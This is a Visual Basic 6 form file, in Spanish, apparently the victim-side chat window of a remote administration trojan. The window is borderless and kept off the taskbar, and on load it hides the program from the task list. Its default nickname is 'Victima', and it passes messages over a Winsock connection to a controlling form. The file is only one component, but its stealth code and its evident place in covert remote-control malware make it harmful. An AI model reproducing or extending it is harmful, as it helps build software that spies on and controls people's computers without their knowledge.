VERSION 5.00
Begin VB.Form chat 
   BorderStyle     =   0  'None
   Caption         =   "Form2"
   ClientHeight    =   4920
   ClientLeft      =   0
   ClientTop       =   0
   ClientWidth     =   8520
   LinkTopic       =   "Form2"
   ScaleHeight     =   4920
   ScaleWidth      =   8520
   ShowInTaskbar   =   0   'False
   StartUpPosition =   2  'CenterScreen
   Begin VB.Frame Frame1 
      Height          =   4935
      Left            =   0
      TabIndex        =   0
      Top             =   0
      Width           =   8535
      Begin VB.TextBox Text2 
         Height          =   285
         Left            =   120
         TabIndex        =   4
         Top             =   4080
         Width           =   6855
      End
      Begin VB.CommandButton Command1 
         Caption         =   "Enviar"
         Height          =   255
         Left            =   7200
         TabIndex        =   3
         Top             =   4080
         Width           =   1215
      End
      Begin VB.TextBox Text4 
         Height          =   285
         Left            =   960
         TabIndex        =   2
         Text            =   "Victima"
         Top             =   4440
         Width           =   1455
      End
      Begin VB.TextBox Text1 
         BackColor       =   &H80000001&
         ForeColor       =   &H000000FF&
         Height          =   3735
         Left            =   120
         Locked          =   -1  'True
         MultiLine       =   -1  'True
         ScrollBars      =   2  'Vertical
         TabIndex        =   1
         Text            =   "chat.frx":0000
         Top             =   240
         Width           =   8295
      End
      Begin VB.Label Label1 
         Caption         =   "Tu Nick:"
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   255
         Left            =   120
         TabIndex        =   5
         Top             =   4440
         Width           =   1335
      End
   End
End
Attribute VB_Name = "chat"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Sub Command1_Click()
Text1.Text = Text1.Text & vbNewLine & Time & " " & Text4.Text & " dice: " & Text2.Text
Form1.WS.SendData "men|" & Text1.Text
Text2.Text = ""
Text2.SetFocus
End Sub

Private Sub Form_Load()
App.TaskVisible = False
End Sub

Private Sub Form_Unload(Cancel As Integer)
On Error Resume Next
Form1.WS.SendData "cierra|"
Text1.Text = "!!!Conexión Cerrada!!!"
End Sub


Private Sub Text2_KeyPress(KeyAscii As Integer)
If KeyAscii = 13 Then
KeyAscii = 0
Call Command1_Click
End If
End Sub

Private Sub Text4_Change()
Form1.WS.SendData "canv|" & Text4.Text
End Sub


Private Sub text1_Change()
On Error Resume Next
Text1.SelStart = Len(Text1.Text)
End Sub
